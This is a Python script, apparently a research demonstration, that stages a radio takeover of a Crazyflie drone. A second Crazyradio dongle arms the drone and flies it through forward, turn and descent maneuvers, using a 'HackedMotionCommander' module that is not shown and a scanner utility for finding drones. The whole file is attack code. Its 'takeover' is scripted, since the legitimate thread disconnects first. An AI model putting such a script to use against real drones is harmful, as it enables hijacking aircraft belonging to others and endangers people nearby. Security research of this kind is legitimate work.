
#!/usr/bin/env python3
"""
Author: fatemehazam-crypto
Email: faa5778@utulsa.edu

Description:
This script demonstrates a complete takeover attack on a Crazyflie drone.
It shows how an attacker can seize control from a legitimate user by connecting
via a different Crazyradio dongle. The script demonstrates proper takeover sequencing.
The hacked_motion_commander.py enables the takeover to take place.

Features:
- Legitimate user control simulation
- Attacker takeover capability
- Threaded execution for realistic timing
- Safety-conscious landing procedures

Usage:
Run this script to demonstrate a drone takeover attack. The legitimate user
takes off first, then the attacker seizes control after a timed delay.

DRONE DISCOVERY:
You don't need to know the exact drone address beforehand. Use the scanner.py 
utility to identify active drones and their communication parameters:

    python scanner.py --scan  # Scan for all available Crazyflie drones
  

Note: -Requires two Crazyradio dongles and a Crazyflie drone.
      -Uses motion commander hence requires a flow deck 
      
"""



import time
import threading
import logging
from cflib.crazyflie import Crazyflie
from cflib import crtp
from cflib.crazyflie.syncCrazyflie import SyncCrazyflie

logging.basicConfig(level=logging.INFO)


def legitimate_control():
    """Normal user controlling the drone - MUST DISCONNECT before attack"""
    normal_uri = "radio://0/80/2M/"
    
    cf_normal = Crazyflie(rw_cache='./cache')
    try:
        cf_normal.open_link(normal_uri)
        time.sleep(2)
        cf_normal.platform.send_arming_request(True)
        time.sleep(1.0)
        
        print("Legitimate user: Taking off...")
        from cflib.positioning.motion_commander import HackedMotionCommander
        mc = HackedMotionCommander(cf_normal, default_height=0.5)
        mc.take_off(0.5)
        time.sleep(2)
        print("✅Legitimate user: Drone airborne")
        
        # ⚠️ CRITICAL: Keep legitimate control for limited time
        time.sleep(8)  # hover
        
        # ⚠️ MUST DISCONNECT before attacker takes over
        print("🛑 Legitimate user: Forced to Disconnect from {normal_uri}")
        mc.land()
        time.sleep(2)
        cf_normal.close_link()  # ⚡ DISCONNECT LEGITIMATE USER
        
    except Exception as e:
        print(f"Legitimate control error: {e}")

def attack_control():
    """Attacker taking over control"""
    time.sleep(7)  # Wait for legitimate user to gain control
    
    #attack_uri = "radio://1/80/2M/E7E7E7E7E7"
    attack_uri = "radio://1/80/2M/"

    cf_attack = Crazyflie(rw_cache='./cache')
    try:
        cf_attack.open_link(attack_uri)
        time.sleep(2)
        cf_attack.platform.send_arming_request(True)
        time.sleep(1.0)
        
        print("⚡ ATTACKER: Taking over control...")
        
        from cflib.positioning.motion_commander import HackedMotionCommander
        mc = HackedMotionCommander(cf_attack, default_height=1.0)
        mc.take_off(1.0)
       
 
        print("✅ ATTACKER: Takeover successful!")
        time.sleep(2)
        # Now perform maneuvers
        mc.forward(1.0)
        time.sleep(3)
        mc.turn_right(90)
        time.sleep(3)
        mc.down(0.85)
        time.sleep(5)   
        mc.land()
        time.sleep(3)
        cf_attack.close_link()
        
    except Exception as e:
        print(f"Attack control error: {e}")
    finally:
        if cf_attack.is_connected():
            cf_attack.close_link()


def run_demo():
    print("BRUSHLESS TAKEOVER DEMO")
    print("==========================")
    print("PHASE 1: Legitimate takeoff and hover")
    print("PHASE 2: Attacker connection and takeover")
    print("")
    
    crtp.init_drivers()
    time.sleep(1)
    
    legit_thread = threading.Thread(target=legitimate_control)
    attack_thread = threading.Thread(target=attack_control)
    
    # Start legitimate control first
    print("🔹 Starting legitimate control...")
    legit_thread.start()
    time.sleep(5)  # Wait for takeoff to complete
    
    # Then start attack control
    print("🔹 Starting attack control (delayed)...")
    attack_thread.start()
    
    legit_thread.join()
    attack_thread.join()
    
    print("✅ Demo completed successfully!")
    return

if __name__ == "__main__":
    run_demo()
